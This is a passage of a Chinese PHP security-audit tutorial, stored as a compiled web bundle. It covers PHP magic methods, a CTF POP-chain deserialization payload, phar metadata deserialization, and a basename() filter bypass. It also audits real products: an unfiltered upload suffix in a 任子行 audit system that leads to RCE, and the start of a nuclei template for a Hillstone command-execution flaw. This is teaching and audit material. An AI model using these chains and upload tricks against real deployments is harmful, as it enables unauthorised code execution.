u7684\u65f6\u5019\u90fd\u662f",(0,r.jsx)(n.code,{children:"$\u5b9e\u4f8b\u5316\u540d\u79f0->\u5c5e\u6027\u540d"}),"\u8fd9\u6837\u7684\u683c\u5f0f\u53bb\u8bbf\u95ee\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5echo\u53bb\u8f93\u51fa\u5bf9\u8c61\uff0c\u53ef\u662f\u5f53\u6211\u4eec\u4f7f\u7528",(0,r.jsx)(n.code,{children:"__tostring()"}),"\u5c31\u53ef\u4ee5\u76f4\u63a5\u7528echo\u6765\u8f93\u51fa\u4e86\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    header(\"Content-Type: text/html; charset=utf-8\");\n\tclass Ameng{\n        public $name;\n        private $age;\n        function __construct($name,$age){\n            $this->name = $name;\n            $this->age = $age;\n        }\n        public function __toString(){\n            return $this->name . $this->age . '\u5c81\u4e86';\n        }\n    }\n\t$ameng = new Ameng('Ameng',3);\n\techo $ameng;\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u7ed3\u679c\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-text",children:"Ameng3\u5c81\u4e86\n"})}),"\n",(0,r.jsx)(n.h4,{id:"__invoke",children:"__invoke()"}),"\n",(0,r.jsxs)(n.p,{children:["\u5f53\u5c1d\u8bd5\u4ee5\u8c03\u7528\u51fd\u6570\u7684\u65b9\u5f0f\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0c",(0,r.jsx)(n.code,{children:"__invoke()"}),"\u65b9\u6cd5\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u7248\u672c\u8981\u6c42\uff1a"}),"\n",(0,r.jsx)(n.p,{children:"PHP > 5.3.\n\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    header(\"Content-Type: text/html; charset=utf-8\");\n\tclass Ameng{\n        public $name;\n        private $age;\n        function __construct($name,$age){\n            $this->name = $name;\n            $this->age = $age;\n        }\n        public function __invoke(){\n           echo '\u4f60\u7528\u8c03\u7528\u51fd\u6570\u7684\u65b9\u5f0f\u8c03\u7528\u4e86\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u6240\u4ee5\u6211\u8d77\u4f5c\u7528\u4e86';\n        }\n    }\n\t$ameng = new Ameng('Ameng',3);\n\t$ameng();\n?>\n\u6267\u884c\u7ed3\u679c\u2014\u2014>\n\u4f60\u7528\u8c03\u7528\u51fd\u6570\u7684\u65b9\u5f0f\u8c03\u7528\u4e86\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u6240\u4ee5\u6211\u8d77\u4f5c\u7528\n"})}),"\n",(0,r.jsx)(n.h4,{id:"pop\u94fe\u7684\u6784\u9020",children:"pop\u94fe\u7684\u6784\u9020"}),"\n",(0,r.jsx)(n.h4,{id:"\u601d\u8def",children:"\u601d\u8def"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u5bfb\u627e\u4f4d\u70b9\uff08unserialize\u51fd\u6570\u2014>\u53d8\u91cf\u53ef\u63a7\uff09"}),"\n",(0,r.jsx)(n.li,{children:"\u6b63\u5411\u6784\u9020\uff08\u5404\u79cd\u65b9\u6cd5\uff09"}),"\n",(0,r.jsx)(n.li,{children:"\u53cd\u5411\u63a8\u7406\uff08\u4ece\u8981\u5b8c\u6210\u7684\u76ee\u7684\u51fa\u53d1\uff0c\u53cd\u5411\u63a8\u7406\uff0c\u6700\u540e\u627e\u5230\u6700\u5148\u88ab\u8c03\u7528\u7684\u4f4d\u7f6e\u5904\uff09"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u6765\u770b\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50(HECTF)\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\nclass Read {\n    public $var;\n    public $token;\n    public $token_flag;\n    public function __construct() { \n         $this->token_flag = $this->token = md5(rand(1,10000));\n         $this->token =&$this->token_flag;\n    }\n    public function __invoke(){\n        $this->token_flag = md5(rand(1,10000));\n        \n        if($this->token === $this->token_flag)\n        {\n            echo "flag{**********}";\n        }\n    }\n}\nclass Show\n{\n    public $source;\n    public $str;\n    public function __construct()\n    {\n        echo $this->source."<br>";\n    }\n\n    public function __toString()\n    {\n        $this->str[\'str\']->source;\n    }\n    public function __wakeup()\n    {\n        if(preg_match("/http|https|file:|gopher|dict|\\.\\./i", $this->source)) {\n            echo "hacker~";\n            $this->source = "index.php";\n        }\n    }\n}\n\nclass Test\n{\n    public $params;\n    public function __construct()\n    {\n        $this->params = array();\n    }\n\n    public function __get($key)\n    {\n        $func = $this->params;\n        return $func();\n    }\n}\nif(isset($_GET[\'chal\']))\n{\n    $chal = unserialize($_GET[\'chal\']);\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u6211\u4eec\u8981\u62ff\u5230flag\uff0c\u5728",(0,r.jsx)(n.code,{children:"__invoke()"}),"\u51fd\u6570\uff0c\u5f53\u5bf9\u8c61\u88ab\u5f53\u4f5c\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u90a3\u4e48\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\u8be5\u51fd\u6570\u3002\u6240\u4ee5\u6211\u4eec\u8981\u505a\u7684\u5c31\u662f\u7528\u51fd\u6570\u6765\u8c03\u7528\u5bf9\u8c61\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u6211\u4eec\u9996\u5148\u627e\u5230\u8d77\u70b9\uff0c\u5c31\u662funserialize\u51fd\u6570\u7684\u53d8\u91cf\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u53d8\u91cf\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u4f46\u662f\u80af\u5b9a\u662f\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u5e38\u89c1\u7684\u534f\u8bae\uff0c\u90a3\u4e9b\u534f\u8bae\u6211\u5728\u4e0a\u9762\u4e5f\u7b80\u5355\u4ecb\u7ecd\u8fc7\u7528\u6cd5\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u901a\u8fc7\u51fd\u6570\u7684\u8fc7\u7a0b\u641c\u7d22\uff0c\u6211\u4eec\u80fd\u591f\u770b\u5230preg_match\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4f1a\u88ab\u5f53\u4f5c\u5b57\u7b26\u4e32\u5904\u7406\uff0c\u5728\u7c7bTest\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9$func\u8d4b\u503c\u7ed9Read\u5bf9\u8c61\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0bpop\u94fe"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php \n    \xb7\xb7\xb7\xb7\xb7\xb7\xb7\xb7\xb7\xb7\n    $read = new Read();\n    $show = new Show();\n    $test = new Test();\n\t\n\t$read->token = &$read->token_flag;\n    $test->params = $read;\n    $show->str['str'] = $test;\n    $show->source = $show;\n    echo serialize($show);\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7ed9\u4e2a\u56fe\u603b\u7ed3\u4e00\u4e0b\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648356.png",alt:"img"})}),"\n",(0,r.jsx)(n.h4,{id:"phar\u4e0e\u53cd\u5e8f\u5217\u5316",children:"phar\u4e0e\u53cd\u5e8f\u5217\u5316"}),"\n",(0,r.jsx)(n.h5,{id:"\u7b80\u4ecb-1",children:"\u7b80\u4ecb"}),"\n",(0,r.jsx)(n.p,{children:'PHAR\uff08"PHP archive"\uff09\u662fPHP\u91cc\u7c7b\u4f3cJAR\u7684\u4e00\u79cd\u6253\u5305\u6587\u4ef6\uff0c\u5728PHP > 5.3\u7248\u672c\u4e2d\u9ed8\u8ba4\u5f00\u542f\u3002\u5176\u5b9e\u5c31\u662f\u7528\u6765\u6253\u5305\u7a0b\u5e8f\u7684\u3002'}),"\n",(0,r.jsx)(n.h5,{id:"\u6587\u4ef6\u7ed3\u6784",children:"\u6587\u4ef6\u7ed3\u6784"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsxs)(n.p,{children:["a stub\uff1a",(0,r.jsx)(n.code,{children:"xxx<?php xxx;__HALT_COMPILER();?>"}),"\u524d\u9762\u5185\u5bb9\u4e0d\u9650\uff0c\u540e\u9762\u5fc5\u987b\u4ee5",(0,r.jsx)(n.code,{children:"__HALT_COMPILER();?>"}),"\u7ed3\u5c3e\uff0c\u5426\u5219phar\u6269\u5c55\u65e0\u6cd5\u5c06\u8be5\u6587\u4ef6\u8bc6\u522b\u4e3aphar\u6587\u4ef6\u3002"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:"\u5b98\u65b9\u624b\u518c"}),"\n",(0,r.jsx)(n.p,{children:"phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u90fd\u653e\u5728\u8fd9\u90e8\u5206\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\uff0c\u8fd9\u662f\u4e0a\u8ff0\u653b\u51fb\u624b\u6cd5\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002"}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648357.png",alt:"img"})}),"\n",(0,r.jsx)(n.h5,{id:"\u5b9e\u9a8c",children:"\u5b9e\u9a8c"}),"\n",(0,r.jsxs)(n.p,{children:["\u524d\u63d0\uff1a\u5c06",(0,r.jsx)(n.code,{children:"php.ini"}),"\u4e2d\u7684",(0,r.jsx)(n.code,{children:"phar.readonly"}),"\u9009\u9879\u8bbe\u7f6e\u4e3a",(0,r.jsx)(n.code,{children:"off"}),"\uff0c\u4e0d\u7136\u65e0\u6cd5\u751f\u6210phar\u6587\u4ef6\u3002"]}),"\n",(0,r.jsx)(n.h6,{id:"pharphp",children:"phar.php\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n    class TestObject {\n    }\n    $phar = new Phar("phar.phar"); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar\n    $phar->startBuffering();\n    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //\u8bbe\u7f6estub\n    $o = new TestObject();\n    $o -> data=\'Hello I am Ameng\';\n    $phar->setMetadata($o); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest\n    $phar->addFromString("test.txt", "test"); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6\n    //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97\n    $phar->stopBuffering();\n?>\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u6211\u4eec\u8bbf\u95ee\u4e4b\u540e\uff0c\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2aphar.phar\u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648358.png",alt:"img"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7136\u540e\u67e5\u770b\u6587\u4ef6\u7684\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u770b\u5230meta-data\u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u3002\u65e2\u7136\u5b58\u5728\u5e8f\u5217\u5316\u7684\u6570\u636e\uff0c\u90a3\u80af\u5b9a\u6709\u5e8f\u5217\u5316\u7684\u9006\u5411\u64cd\u4f5c\u53cd\u5e8f\u5217\u5316\u3002\u90a3\u4e48\u8fd9\u91cc\u5728PHP\u4e2d\u5b58\u5728\u5f88\u591a\u901a\u8fc7",(0,r.jsx)(n.code,{children:"phar://"}),"\u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\uff0c\u4f1a\u5c06meta-data\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u3002\u53ef\u7528\u51fd\u6570\u5982\u4e0b\u56fe"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648359.png",alt:"img"})}),"\n",(0,r.jsx)(n.h6,{id:"amengphp",children:"Ameng.php"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\nclass TestObject{\n    function __destruct()\n    {\n        echo $this -> data;   // TODO: Implement __destruct() method.\n    }\n}\ninclude('phar://phar.phar');\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u7ed3\u679c\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648360.png",alt:"img"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u91cc\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0bphar\u7684\u5927\u81f4\u5e94\u7528\uff0c\u66f4\u8be6\u7ec6\u53ef\u4ee5\u53c2\u8003",(0,r.jsx)(n.a,{href:"https://paper.seebug.org/680/",children:"seebug (opens new window)"}),"\u3002"]}),"\n",(0,r.jsx)(n.h3,{id:"\u5176\u4ed6\u4e00\u4e9b\u603b\u7ed3",children:"\u5176\u4ed6\u4e00\u4e9b\u603b\u7ed3"}),"\n",(0,r.jsx)(n.h4,{id:"basename",children:"basename()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u8fd4\u56de\u8def\u5f84\u4e2d\u7684\u6587\u4ef6\u540d\u7684\u4e00\u90e8\u5206(\u540e\u9762)"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"basename(path,suffix)\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-31",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"path\uff1a\u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u68c0\u67e5\u7684\u8def\u5f84\u3002"}),"\n",(0,r.jsx)(n.li,{children:"suffix\uff1a\u53ef\u9009\u3002\u89c4\u5b9a\u6587\u4ef6\u7684\u6269\u5c55\u540d\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n    $path = "index.php/test.php";\n\techo basename($path);\n?>\n        \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\ntest.php\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u8fd8\u6709\u4e00\u4e2a\u7279\u70b9\uff0c\u5c31\u662f\u4f1a\u53bb\u6389\u6587\u4ef6\u540d\u7684\u975eASCII\u7801\u503c\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\t$path = $_GET['x'];\n\tprint_r(basename($path));\n?>\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6211\u4eec\u901a\u8fc7 url \u4f20\u5165\u53c2\u6570",(0,r.jsx)(n.code,{children:"x=index.php/config.php/%ff"})]}),"\n",(0,r.jsx)(n.p,{children:"\u7ed3\u679c\u5982\u4e0b\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648361.png",alt:"img"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6211\u4eec\u770b\u5230\uff0c",(0,r.jsx)(n.code,{children:"%ff"}),"\u76f4\u63a5\u6ca1\u4e86\uff0c\u800c\u662f\u76f4\u63a5\u8f93\u51fa\u524d\u9762\u7684\u7684\u6587\u4ef6\u540d\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u7528\u6765\u7ed5\u8fc7\u4e00\u4e9b\u6b63\u5219\u5339\u914d\u3002\u539f\u56e0\u5c31\u5728\u4e8e",(0,r.jsx)(n.code,{children:"%ff"}),"\u5728\u901a\u8fc7 url \u4f20\u53c2\u65f6\u4f1a\u88ab url \u89e3\u7801\uff0c\u89e3\u7801\u6210\u4e86\u4e0d\u53ef\u89c1\u5b57\u7b26\uff0c\u6ee1\u8db3\u4e86",(0,r.jsx)(n.code,{children:"basename"}),"\u51fd\u6570\u5bf9\u6587\u4ef6\u540d\u7684\u975eASCII\u503c\u53bb\u9664\u7684\u7279\u70b9\uff0c\u4ece\u800c\u88ab\u5220\u6389\u3002"]}),"\n",(0,r.jsx)(n.h2,{id:"\u5b9e\u6218\u9879\u76ee",children:"\u5b9e\u6218\u9879\u76ee"}),"\n",(0,r.jsx)(n.h3,{id:"\u4efb\u5b50\u884c\u7f51\u7edc\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edfphp",children:"\u4efb\u5b50\u884c\u7f51\u7edc\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf(PHP)"}),"\n",(0,r.jsxs)(n.p,{children:["\u5bfb\u627e\u5173\u952e\u51fd\u6570 ",(0,r.jsx)(n.code,{children:"move_uploaded_file"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648362.png",alt:"image-20240910171850890"})}),"\n",(0,r.jsx)(n.p,{children:"\u63d0\u53d6\u90e8\u5206\u4ee3\u7801\u8fdb\u884c\u5206\u6790"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"if($get_url_param == 'aaa_local_web_preview'){\n\tif($_GET['name']!=null) $filename = formatget($_GET['name']);\n\tif($_GET['suffix']!=null) $suffix = formatget($_GET['suffix']);\n\tif($_GET['webTitle']!=null) $webTitle = formatget($_GET['webTitle']);\n\tif($_GET['wcmWord']!=null) $wcmWord = formatget($_GET['wcmWord']);\n\tif($_GET['titleOnly']!=null) $titleOnly = formatget($_GET['titleOnly']);\n\n\tif($_GET['read']!=null) $read = formatget($_GET['read']);\n\t$read = ($read)?$read:0;\n\n\t$webTitle = ($webTitle)?$webTitle:\"\";\n\t$wcmWord = ($wcmWord)?$wcmWord:\"\";\n\n\t$webTitle = utf8format($webTitle);\n\t$wcmWord = utf8format($wcmWord);\t\n\t\n\t//\u5df2\u7ecf\u9884\u89c8\u8fc7\uff0c\u4e0d\u518d\u8fdb\u884c\u4e0a\u4f20\u56fe\u7247\u52a8\u4f5c\uff0c\u4e14\u4e0d\u5220\u9664tmpPic\u6587\u4ef6\n\tif(!$read){\n\t\t\tif((!file_exists('/usr/local/webui/auth/images/tmpPic.jpg'))&&(!file_exists('/usr/local/webui/auth/images/tmpPic.jpg'))&&(!file_exists('/usr/local/webui/auth/images/tmpPic.png'))&&(!file_exists('/usr/local/webui/auth/images/tmpPic.jpeg'))&&(!file_exists('/usr/local/webui/auth/images/tmpPic.gif'))&&(!file_exists('/usr/local/webui/auth/images/tmpPic'))){\n\t\t\tmove_uploaded_file($_FILES[$filename][\"tmp_name\"],'/usr/local/webui/auth/images/tmpPic'.$suffix);\n\t\t\t$preview_tip = '\u4e0a\u4f20\u6587\u4ef6\u8fc7\u5927\uff0c\u5efa\u8bae\u5c0f\u4e8e'.$size.'MB';\n\t\t\tif(filesize('/usr/local/webui/auth/images/tmpPic'.$suffix)>$bytesize){\n\t\t\t\tunlink('/usr/local/webui/auth/images/tmpPic'.$suffix);\n\t\t\t\techo \"{\";\n\t\t\t\techo\t\t\t\t\"tip: '\" . $preview_tip . \"',\\n\";\n\t\t\t\techo\t\t\t\t\"msg: '\" . $msg . \"'\\n\";\n\t\t\t\techo \"}\";\n\t\t\t\treturn;\n\t\t\t}\n\t\t}else{\n\t\t\tmove_uploaded_file($_FILES[$filename][\"tmp_name\"],'/usr/local/webui/auth/images/test'.$suffix);\n\t\t\t$preview_tip = '\u4e0a\u4f20\u6587\u4ef6\u8fc7\u5927\uff0c\u5efa\u8bae\u5c0f\u4e8e'.$size.'MB';\n\t\t\tif(filesize('/usr/local/webui/auth/images/test'.$suffix)>$bytesize){\n\t\t\t\techo \"{\";\n\t\t\t\techo\t\t\t\t\"tip: '\" . $preview_tip . \"',\\n\";\n\t\t\t\techo\t\t\t\t\"msg: '\" . $msg . \"'\\n\";\n\t\t\t\techo \"}\";\n\t\t\t\treturn;\n\t\t\t}else{\n\t\t\t\tunlink('/usr/local/webui/auth/images/tmpPic.jpg');\n\t\t\t\tunlink('/usr/local/webui/auth/images/tmpPic.png');\n\t\t\t\tunlink('/usr/local/webui/auth/images/tmpPic.gif');\n\t\t\t\tunlink('/usr/local/webui/auth/images/tmpPic.jpeg');\n\t\t\t\tunlink('/usr/local/webui/auth/images/tmpPic');\n\t\t\t\trename('/usr/local/webui/auth/images/test'.$suffix,'/usr/local/webui/auth/images/tmpPic'.$suffix);\n\t\t\t}\n\t\t}\n\n\t}\n\n\t\n\t$tmpPage = file_get_contents('/usr/local/webui/auth/index_template.html',true);\n\n\tif($suffix == \"milo\"){\n\t\t$newName = \"main.jpg\";\n\t}else{\n\t\t$newName = 'tmpPic'.$suffix;\n\t}\n\t\n\t//\u6362\n\t\n\t//\u53d6\u6d88\u6309\u94ae\u4f5c\u7528\n\t$tmpPage = str_replace('onclick', '',$tmpPage);\n\t//$tmpPage = str_replace('button', 'but',$tmpPage);\n\t$tmpPage = str_replace('function form_submit()', 'function form_fail()',$tmpPage);\n\t$tmpPage = str_replace('javascript:login_out();', 'javascript:;',$tmpPage);\n\t$tmpPage = str_replace('auth_changepwd.html?weburl=', '',$tmpPage);\n\t$tmpPage = str_replace('{title}', $webTitle,$tmpPage);\n\t$tmpPage = str_replace('{wcmWord}', $wcmWord,$tmpPage);\n\t$tmpPage = str_replace('main.jpg', $newName,$tmpPage);\n\n\tfile_put_contents('/usr/local/webui/auth/preview.html',$tmpPage);\n\n\t$new = $filename;\n\t$msg = \"success\";\n\n\techo \"{\";\n\techo\t\t\t\t\"error: '\" . $new . \"',\\n\";\n\techo\t\t\t\t\"msg: '\" . $msg . \"'\\n\";\n\techo \"}\";\n\treturn;\n}\n\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u53d1\u73b0\u5371\u9669\u4f4d\u7f6e",(0,r.jsx)(n.code,{children:"move_uploaded_file"}),"\u8be5\u903b\u8f91\u91cc\u5b58\u5728\u4e24\u4e2a\uff0c\u7b2c\u4e00\u4e2a\u53d1\u73b0\u662f\u9700\u8981\u5b58\u5728\u7684\u624d\u80fd\u8fdb\u5165\u5176\u4e2d\uff0c\u6240\u4ee5\u76f4\u63a5\u770b\u7b2c\u4e8c\u4e2a\u5373\u53ef"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648363.png",alt:"image-20240910172055291"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5411\u4e0a\u627e\u5bfb",(0,r.jsx)(n.code,{children:"$suffix"})," \u53c2\u6570\uff0c\u53d1\u73b0\u662f\u901a\u8fc7",(0,r.jsx)(n.code,{children:"GET"}),"\u4f20\u5165\uff0c\u4e14\u8fdb\u5165",(0,r.jsx)(n.code,{children:"formatget"}),"\u51fd\u6570"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648364.png",alt:"image-20240910172352684"})}),"\n",(0,r.jsxs)(n.p,{children:["\u67e5\u8be2",(0,r.jsx)(n.code,{children:"formatget"}),"\u51fd\u6570\u5b58\u5728\u4e24\u4e2a\u7528\u6cd5\uff0c\u4f46\u8fd9\u4e24\u4e2a\u51fd\u6570\u4f60\u4f1a\u53d1\u73b0\u662f\u4e00\u81f4\u7684"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648365.png",alt:"image-20240910172435968"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648366.png",alt:"image-20240910172515067"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"htmlspecialchars"}),"\u4e3a\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3aHTML\u7f16\u7801\uff0c\u8fd4\u56de\u4e00\u4e2a\u53bb\u6389\u53cd\u659c\u6760\u7684\u5b57\u7b26\u4e32\u3002",(0,r.jsx)(n.code,{children:"stripslashes"}),"\u8bc6\u522b\u7c7b\u4f3c C \u7684 ",(0,r.jsx)(n.code,{children:"\\n"}),"\u3001",(0,r.jsx)(n.code,{children:"\\r"})," ...\u3001\u516b\u8fdb\u5236\u548c\u5341\u516d\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002\u5747\u65e0\u4f24\u5927\u96c5\u3002\u4e5f\u5c31\u662f\u662f\u8bf4",(0,r.jsx)(n.code,{children:"suffix"}),"\u4f5c\u4e3a\u540d\u79f0\u62fc\u63a5\u5230\u6587\u4ef6\u540d\u4e0a\u5e76\u672a\u505a\u4efb\u4f55\u8fc7\u6ee4\u3002"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648367.png",alt:"image-20240910172828260"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e8e\u662f\u6211\u4eec\u6784\u9020\u4e00\u4e0b\u8bf7\u6c42\u5305\uff0c\u5e76\u53d1\u751f\u8bf7\u6c42\u5305\u5373\u53ef\u4e0a\u4f20\u6587\u4ef6"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648368.png",alt:"image-20240910173034048"})}),"\n",(0,r.jsx)(n.p,{children:"\u8bbf\u95ee\u4e0a\u4f20\u5730\u5740\u5373\u53efRCE"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648369.png",alt:"image-20240910173256273"})}),"\n",(0,r.jsx)(n.h3,{id:"\u5c71\u77f3\u4e91\u9274\u4e3b\u673a\u5b89\u5168\u7ba1\u7406\u7cfb\u7edfphppython",children:"\u5c71\u77f3\u4e91\u9274\u4e3b\u673a\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf(PHP\u3001Python)"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u5c71\u77f3\u4e91\u9274\u4e3b\u673a\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\u5b58\u5728\u524d\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u6ca1\u6709\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u5355\u53ea\u80fd\u901a\u8fc7\u6587\u4ef6\u67e5\u770b\u56de\u663e\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-yaml",children:'id: hillstonenet-yunjian-rce2\n\ninfo:\n  name: \u5c71\u77f3\u4e91\u9274\u4e3b\u673a\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\u524d\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e2\n  author: b1ak2\n  severity: critical\n  description: |\n   \u5c71\u77f3\u4e91\u9274\u4e3b\u673a\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\u5b58\u5728\u524d\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u6ca1\u6709\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u5355\u53ea\u80fd\u901a\u8fc7\u6587\u4ef6\u67e5\u770b\u56de\u663e\u3002\n  reference:\n    - https://github.com/wy876/POC/blob/8e6d282d2616c5d5296e698f16bdcae2462ebe5c/%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91%E4%BA%91%E9%89%B4%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md\n  metadata: \n    fofa-query: 